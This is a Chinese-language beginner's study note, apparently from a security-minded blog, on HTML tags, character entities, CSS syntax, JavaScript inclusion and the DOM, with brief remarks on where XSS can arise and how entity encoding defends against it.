        <content type="html"><![CDATA[<h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><p><strong>超文本标记</strong>语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><p>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。</p><p>先贴一个最基本的骨架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;meta charset=&quot;UTF-8&quot;&gt;       &lt;!--表示网页字符编码--&gt;</span><br><span class="line">     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">     &lt;title&gt;尤智的第一个图片网页&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     &lt;strong&gt;&lt;/strong&gt;&lt;h1 align=&quot;center&quot;&gt;冰与火之歌&lt;/h1&gt;</span><br><span class="line">     &lt;hr\&gt;</span><br><span class="line">     &lt;a href=&quot;https://music.163.com/#/user/home?id=1557906461&quot; target=&quot;-blank&quot;&gt;关注作者&lt;/a&gt;</span><br><span class="line">     &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; </span><br><span class="line">     &lt;i&gt;&lt;h2&gt;目录指引&lt;/h2&gt;&lt;/body&gt;&lt;/i&gt;</span><br><span class="line">     &lt;a href=&quot;#冰山&quot;&gt;冰山&lt;/a&gt;  &lt;br/&gt;</span><br><span class="line">     &lt;a href=&quot;#火山&quot;&gt;火山&lt;/a&gt;</span><br><span class="line">     &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; &lt;br/&gt;</span><br><span class="line">     &lt;h3 align=&quot;center&quot;&gt;&lt;a name=&quot;冰山&quot;&gt;冰山&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">     &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; &lt;br/&gt;</span><br><span class="line">     &lt;img src=&quot;C:\Users\尤智\Pictures\Saved Pictures\冰山.jpg&quot; title=&quot;冰山&quot; alt=&quot;请尝试刷新&quot;  width=&quot;90%&quot; /&gt;</span><br><span class="line">     &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; &lt;br/&gt;</span><br><span class="line">     &lt;h3 align=&quot;center&quot;&gt;&lt;a name=&quot;火山&quot;&gt;火山&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">     &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;br/&gt; &lt;br/&gt; &lt;br/&gt;</span><br><span class="line">     &lt;img src=&quot;C:\Users\尤智\Pictures\Saved Pictures\火山.jpg&quot; title=&quot;火山&quot; alt=&quot;请尝试刷新&quot;  width=&quot;90%&quot; /&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><h5 id="骨架"><a href="#骨架" class="headerlink" title="骨架"></a>骨架</h5><p>包括根标签（页面中最大的标签称为根标签）,head标签（在这里设置title标签），body标签（主体，包含文档主体内容）。</p><h5 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h5><p>.html</p><p>.htm</p><p>以上两种后缀名没有区别，都可以使用。</p><h5 id="标签与属性"><a href="#标签与属性" class="headerlink" title="标签与属性"></a>标签与属性</h5><p>一些常用标签：</p><h6 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> &lt;h1 align=&quot;center&quot;&gt;一级标签&lt;/h1&gt;          //属性align，属性值left，right，center    属性=&quot;属性值&quot;</span><br><span class="line"> &lt;h2&gt;二级标签&lt;/h2&gt;                          </span><br><span class="line"> &lt;h3&gt;三级标签&lt;/h3&gt;</span><br></pre></td></tr></table></figure><h6 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &lt;p&gt;第一段&lt;/p&gt;</span><br><span class="line"> &lt;p&gt;第二段&lt;/p&gt;            //如果不用段落标签，文本默认不会自动换行</span><br></pre></td></tr></table></figure><h6 id="换行标签"><a href="#换行标签" class="headerlink" title="换行标签"></a>换行标签</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> xxx</span><br><span class="line"> &lt;/br&gt;                    //罕见的单标签</span><br><span class="line"> xxx</span><br></pre></td></tr></table></figure><h5 id="注释与特殊符号（重要）"><a href="#注释与特殊符号（重要）" class="headerlink" title="注释与特殊符号（重要）"></a>注释与特殊符号（重要）</h5><p>在 HTML 中，某些字符是预留的。</p><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 描述       实体名称                 //实体名称对大小写敏感！</span><br><span class="line"> &lt;     :      &amp;lt</span><br><span class="line"> &gt;     :      &amp;gt</span><br><span class="line"> 空格  :     &amp;nbsp</span><br><span class="line"> &quot;&quot;    :     &amp;quot;&amp;quot;</span><br></pre></td></tr></table></figure><p>有一些注入漏洞预防方法就是把特殊符号实体化，使得它不能再被当做代码来执行(例如DOM型xss)，也达到了防止数据变成代码的目的 -》<strong>这样貌似没办法注入了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 编码概念：</span><br><span class="line"> html字符实体：呈现html页面时，对某些特殊字符直接使用，浏览器会误以为它们标签的开始或结束，想正确的在html页面呈现特殊字符就需要用到其对应的字符实体。字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号。字符实体以&amp;开头+预先定义的实体名称，以分号结束，</span><br><span class="line"> ​</span><br><span class="line"> JavaScript编码：最常用的如\uXXXX”这种写法为Unicode转义序列，表示一个字符，其中xxxx表示一个16进制数字，</span><br><span class="line"> ​</span><br><span class="line"> URL编码：%加字符的ASCI编码对于的2位16进制数字，如”&quot;对应的URL编码为%2f。不能对协议类型进行任何的编码操作，否则url解释器会认为是无类型。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 先熟悉一下浏览器的流程：</span><br><span class="line"> ​</span><br><span class="line"> 1.浏览器解释html</span><br><span class="line"> ​</span><br><span class="line"> 2.标签转换为dom节点，识别标签时html解释器无法识别被实体编码的内容，建立dom树才能对每个节点的内容进行识别</span><br><span class="line"> 也就是说实体化的特殊字符导致恶意标签不能被识别成一个DOM 节点，而建立dom树才能对每个节点的内容进行识别，达到防御的目的。</span><br><span class="line"> ​</span><br><span class="line"> 3.js解析器对dom树进行修改，如果浏览器遇到url的上下文环境，这时url解释器也会介入完成url的解码工作，url解释器的解码顺序会根据url所在位置不同，可能在js解析器之前或之后</span><br></pre></td></tr></table></figure><h4 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;img src=&quot;相对路径或绝对路径&quot;&gt;     </span><br><span class="line"> 相关属性：</span><br><span class="line"> src：图片地址</span><br><span class="line"> title：图片标题（靠近图片时会显示）</span><br><span class="line"> alt:(当图片加载失败时显示)</span><br><span class="line"> width，height···</span><br></pre></td></tr></table></figure><h4 id="超链接标题"><a href="#超链接标题" class="headerlink" title="超链接标题"></a>超链接标题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;网页网址&quot;&gt;文字信息&lt;/a&gt;</span><br><span class="line">href:网页网址（如果是外站，需要加http(s)://）</span><br><span class="line"></span><br><span class="line">跨网页传送：</span><br><span class="line">&lt;a href=&quot;./demo01.html#名称1&quot;&gt;hhh&lt;/a&gt;</span><br><span class="line">（另一个地方）</span><br><span class="line">&lt;h4&gt;&lt;a name=&quot;名称1&quot;&gt;hhh&lt;/a&gt;&lt;/h4&gt;    //实现超链接的跳转</span><br></pre></td></tr></table></figure><h4 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;数据提交的地址&quot; method=&quot;数据提交的地方&quot;&gt;</span><br><span class="line">    &lt;input type&quot;控件类型&quot; name=&quot;提交到后端的数据标识&quot; value=&quot;控件的值&quot;&gt;//表单控件</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>一些控件（涉及xss闭合） （dd）</p><p>select</p><p>textarea</p><p>button</p><p>一些特殊属性：（涉及关于html代码的ctf）</p><p>readonly（只读属性），disable（不可用属性）</p><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p><strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言。</p><p>通过使用 <strong>CSS</strong> 我们可以大大提升网页开发的工作效率！</p><h4 id="后缀-1"><a href="#后缀-1" class="headerlink" title="后缀"></a>后缀</h4><p><strong>CSS</strong> 文件扩展名为 .css</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    background-color:#d0e4fe;</span><br><span class="line">&#125;</span><br><span class="line">h1 &#123;</span><br><span class="line">    color:orange;</span><br><span class="line">    text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">p &#123;</span><br><span class="line">    font-family:&quot;Times New Roman&quot;;</span><br><span class="line">    font-size:20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h4><p>1.行内样式表：在对应标签加上一个style属性</p><p>2.内部样式表：加一个style标签在body里</p><p>3.外部样式表：再加一个css文件来编辑（常用）</p><h4 id="语法-非行内"><a href="#语法-非行内" class="headerlink" title="语法(非行内)"></a>语法(非行内)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">选择器&#123;</span><br><span class="line">    css属性1：属性值2；</span><br><span class="line">    css属性2：属性值2；</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择器：标签选择器（p&#x2F;h1&#x2F;h2），类选择器（class），ID选择器</p><h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h3><p>JavaScript（简称“JS”） 是一种具有<strong>函数优先</strong>的<strong>轻量级</strong>，<strong>解释型</strong>或<strong>即时编译型</strong>的 编程语言 （脚本语言）</p><p>关于<strong>脚本语言</strong>:是一种不需要编译的语言</p><h4 id="引入方式-1"><a href="#引入方式-1" class="headerlink" title="引入方式"></a>引入方式</h4><p><strong>内部js</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;p&gt;这是一个段落&lt;/p&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将js代码写在<script></script>中</p><p><strong>外部js</strong>：需要一个单独js文件，通过script引入连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;js所在地址&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>事件js</strong>（xss注入漏洞点）</p><p>顾名思义，需要时间做支撑：单击事件，获取焦点事件，失去焦点事件。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;js代码&quot;&gt;hhh&lt;/button&gt;    //执行js代码</span><br><span class="line"> &lt;button onclick=&quot;网址&quot;&gt;hhh&lt;/button&gt;     //网页跳转</span><br></pre></td></tr></table></figure><p><strong>伪协议</strong>（xss注入漏洞点）：通常在a标签上面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:js代码&quot;&gt;hhh&lt;/a&gt;</span><br><span class="line">//通常将伪协议写在href中，以javascript:开头然后接js代码</span><br></pre></td></tr></table></figure><h4 id="引用对象"><a href="#引用对象" class="headerlink" title="引用对象"></a>引用对象</h4><p>对象（object）：dom对象</p><p>数组（array）</p><p>函数（function）</p><h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>dom-&gt;document:文档对象-&gt;网页标签在浏览器上都是一个dom对象！</p><p>通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。</p><p>要求：找dom对象，操作dom对象，动态的创建dom对象</p><h6 id="关于DOM-节点："><a href="#关于DOM-节点：" class="headerlink" title="关于DOM 节点："></a><strong>关于DOM 节点</strong>：</h6><p>在 HTML DOM 中，所有事物都是节点。DOM 是被视为节点树的 HTML。</p><p>根据 W3C 的 HTML DOM 标准，HTML 文档中的所有内容都是节点：</p><ul><li>整个文档是一个文档节点</li><li>每个 HTML 元素是元素节点</li><li>HTML 元素内的文本是文本节点</li><li>每个 HTML 属性是属性节点</li><li>注释是注释节点</li></ul><p><strong>HTML DOM 节点树</strong></p><p>HTML DOM 将 HTML 文档视作树结构。这种结构被称为<strong>节点树</strong></p><p>实例：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/ct_htmltree.gif"></p><p><strong>查找dom对象</strong>：通过id&#x2F;标签名&#x2F;类名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id:</span><br><span class="line">var x=document.getElementById(&quot;intro&quot;); </span><br><span class="line">标签名：</span><br><span class="line">var x=document.getElementById(&quot;main&quot;);</span><br><span class="line">var y=x.getElementsByTagName(&quot;p&quot;); </span><br><span class="line">类名：</span><br><span class="line">var x=document.getElementsByClassName(&quot;intro&quot;); </span><br></pre></td></tr></table></figure><p><strong>修改dom对象</strong>：</p><p>修改 HTML 内容的最简单的方法是使用 innerHTML 属性。</p><p>如需改变 HTML 元素的内容，请使用这个语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(id).innerHTML=新的 HTML</span><br></pre></td></tr></table></figure><p>如需改变 HTML 元素的属性，请使用这个语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(id).attribute=新属性值</span><br><span class="line">例如</span><br><span class="line">document.getElementById(&quot;image&quot;).src=&quot;landscape.jpg&quot;;</span><br></pre></td></tr></table></figure><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/正则表达式主体/修饰符(可选)</span><br></pre></td></tr></table></figure><p>表达式</p><p>特殊字符</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012151319326.png" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012151521036-1024x655.png" style="zoom: 67%;" /><p>限定字符</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012151620483-1024x740.png" style="zoom: 67%;" /><p>修饰符</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012151717422-1024x275.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
